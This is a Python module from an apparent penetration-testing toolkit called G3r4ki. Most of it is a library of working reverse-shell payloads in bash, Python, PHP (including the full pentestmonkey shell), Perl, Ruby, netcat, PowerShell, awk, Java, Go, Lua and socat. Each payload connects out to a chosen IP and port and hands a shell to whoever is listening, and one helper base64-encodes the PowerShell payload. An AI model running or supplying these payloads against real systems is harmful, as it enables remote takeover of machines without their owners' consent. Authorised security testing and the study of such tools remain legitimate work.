"""
G3r4ki Reverse Shell Library

This module provides functions to generate various types of reverse shells
for penetration testing purposes.
"""

import socket
import os
import json
import logging
from typing import Dict, List, Optional, Any

# Setup logging
logger = logging.getLogger("g3r4ki.pentest.shells")

# Shell templates
SHELL_TEMPLATES = {
    "bash": {
        "basic": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "alternative": "/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
        "exec": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
        "dev_tcp": "exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done",
        "base64": "echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC97aXB9L3twb3J0fSAwPiYx' | base64 -d | bash",
        "devcat": "/bin/bash -c \"dev=$(tty); exec 3<>/dev/tcp/{ip}/{port}; cat <&3 | while read -r line; do eval \\\"$line\\\" 2>&3 >&3; done <$dev\""
    },
    "python": {
        "basic": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "3": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "short": "python -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
        "windows": "python.exe -c \"import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])\""
    },
    "php": {
        "basic": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "pentestmonkey": "<?php set_time_limit (0); $VERSION = \"1.0\"; $ip = '{ip}'; $port = {port}; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) {{ $pid = pcntl_fork(); if ($pid == -1) {{ printit(\"ERROR: Can't fork\"); exit(1); }} if ($pid) {{ exit(0); }} if (posix_setsid() == -1) {{ printit(\"Error: Can't setsid()\"); exit(1); }} $daemon = 1; }} else {{ printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); }} chdir(\"/\"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) {{ printit(\"$errstr ($errno)\"); exit(1); }} $descriptorspec = array(0 => array(\"pipe\", \"r\"), 1 => array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) {{ printit(\"ERROR: Can't spawn shell\"); exit(1); }} stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) {{ if (feof($sock)) {{ printit(\"ERROR: Shell connection terminated\"); break; }} if (feof($pipes[1])) {{ printit(\"ERROR: Shell process terminated\"); break; }} $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) {{ if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); }} if (in_array($pipes[1], $read_a)) {{ if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); }} if (in_array($pipes[2], $read_a)) {{ if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); }} }} fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {{ if (!$daemon) {{ print \"$string\\n\"; }} }} ?>",
        "exec": "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "system": "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "passthru": "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "shell": "php -r '$sock=fsockopen(\"{ip}\",{port});`/bin/sh -i <&3 >&3 2>&3`;'"
    },
    "perl": {
        "basic": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "nosh": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
        "windows": "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
    },
    "ruby": {
        "basic": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "nosh": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        "windows": "ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"
    },
    "netcat": {
        "basic": "nc -e /bin/sh {ip} {port}",
        "mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "pipe": "rm -f /tmp/p; mknod /tmp/p p && nc {ip} {port} 0</tmp/p | /bin/bash 1>/tmp/p",
        "exec": "nc {ip} {port} -e /bin/bash",
        "udp": "mkfifo fifo; nc -u {ip} {port} < fifo | /bin/sh > fifo 2>&1; rm fifo"
    },
    "powershell": {
        "basic": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "download_cradle": "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "base64": "powershell -e $base64_encoded_payload"
    },
    "awk": {
        "basic": "awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null"
    },
    "java": {
        "basic": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor();"
    },
    "golang": {
        "basic": "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
    },
    "lua": {
        "basic": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
    },
    "socat": {
        "basic": "socat TCP:{ip}:{port} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
        "tty": "socat TCP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane"
    }
}

def list_shell_types() -> List[str]:
    """
    List available reverse shell types
    
    Returns:
        List of shell type names
    """
    return list(SHELL_TEMPLATES.keys())

def list_variants(shell_type: str) -> List[str]:
    """
    List available variants for a given shell type
    
    Args:
        shell_type: Shell type name
        
    Returns:
        List of variant names for the given shell type
    """
    if shell_type not in SHELL_TEMPLATES:
        logger.error(f"Unknown shell type: {shell_type}")
        return []
    
    return list(SHELL_TEMPLATES[shell_type].keys())

def get_shell_template(shell_type: str, variant: str = "basic") -> Optional[str]:
    """
    Get shell template for a given type and variant
    
    Args:
        shell_type: Shell type name
        variant: Variant name
        
    Returns:
        Shell template string or None if not found
    """
    if shell_type not in SHELL_TEMPLATES:
        logger.error(f"Unknown shell type: {shell_type}")
        return None
    
    templates = SHELL_TEMPLATES[shell_type]
    if variant not in templates:
        logger.error(f"Unknown variant '{variant}' for shell type '{shell_type}'")
        return None
    
    return templates[variant]

def get_local_ip() -> str:
    """
    Get local IP address
    
    Returns:
        Local IP address string
    """
    try:
        # Create a socket to determine the outgoing IP address
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Connect to Google DNS
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        logger.error(f"Error determining local IP: {str(e)}")
        # Fallback to loopback address
        return "127.0.0.1"

def generate_shell(shell_type: str, variant: str = "basic", ip: Optional[str] = None, port: int = 4444) -> str:
    """
    Generate a reverse shell command
    
    Args:
        shell_type: Shell type name (e.g., "bash", "python")
        variant: Variant name (e.g., "basic", "alternative")
        ip: IP address to connect back to
        port: Port to connect back to
    
    Returns:
        Generated shell command string
    
    Raises:
        ValueError: If shell type or variant is unknown
    """
    if not ip:
        ip = get_local_ip()
    
    template = get_shell_template(shell_type, variant)
    if not template:
        raise ValueError(f"Unknown shell type '{shell_type}' or variant '{variant}'")
    
    # Special handling for PowerShell base64 variant
    if shell_type == "powershell" and variant == "base64":
        # Get the basic PowerShell payload
        ps_payload = SHELL_TEMPLATES["powershell"]["basic"].format(ip=ip, port=port)
        
        # Convert to UTF-16LE and Base64 encode (required for PowerShell)
        ps_bytes = ps_payload.encode('utf-16le')
        import base64
        base64_payload = base64.b64encode(ps_bytes).decode()
        
        return f"powershell -e {base64_payload}"
    
    # Format the template with IP and port
    try:
        return template.format(ip=ip, port=port)
    except KeyError as e:
        logger.error(f"Error formatting shell template: {str(e)}")
        raise ValueError(f"Invalid template format for '{shell_type}:{variant}'")

def get_bash_shell(variant: str = "basic", ip: Optional[str] = None, port: int = 4444) -> str:
    """Generate a bash reverse shell"""
    return generate_shell("bash", variant, ip, port)

def get_python_shell(variant: str = "basic", ip: Optional[str] = None, port: int = 4444) -> str:
    """Generate a Python reverse shell"""
    return generate_shell("python", variant, ip, port)

def get_perl_shell(variant: str = "basic", ip: Optional[str] = None, port: int = 4444) -> str:
    """Generate a Perl reverse shell"""
    return generate_shell("perl", variant, ip, port)

def get_ruby_shell(variant: str = "basic", ip: Optional[str] = None, port: int = 4444) -> str:
    """Generate a Ruby reverse shell"""
    return generate_shell("ruby", variant, ip, port)

def get_php_shell(variant: str = "basic", ip: Optional[str] = None, port: int = 4444) -> str:
    """Generate a PHP reverse shell"""
    return generate_shell("php", variant, ip, port)

def get_powershell_shell(variant: str = "basic", ip: Optional[str] = None, port: int = 4444) -> str:
    """Generate a PowerShell reverse shell"""
    return generate_shell("powershell", variant, ip, port)

def get_netcat_shell(variant: str = "basic", ip: Optional[str] = None, port: int = 4444) -> str:
    """Generate a netcat reverse shell"""
    return generate_shell("netcat", variant, ip, port)

def get_java_shell(ip: Optional[str] = None, port: int = 4444) -> str:
    """Generate a Java reverse shell"""
    return generate_shell("java", "basic", ip, port)

def get_golang_shell(ip: Optional[str] = None, port: int = 4444) -> str:
    """Generate a Golang reverse shell"""
    return generate_shell("golang", "basic", ip, port)

def get_socat_shell(variant: str = "basic", ip: Optional[str] = None, port: int = 4444) -> str:
    """Generate a socat reverse shell"""
    return generate_shell("socat", variant, ip, port)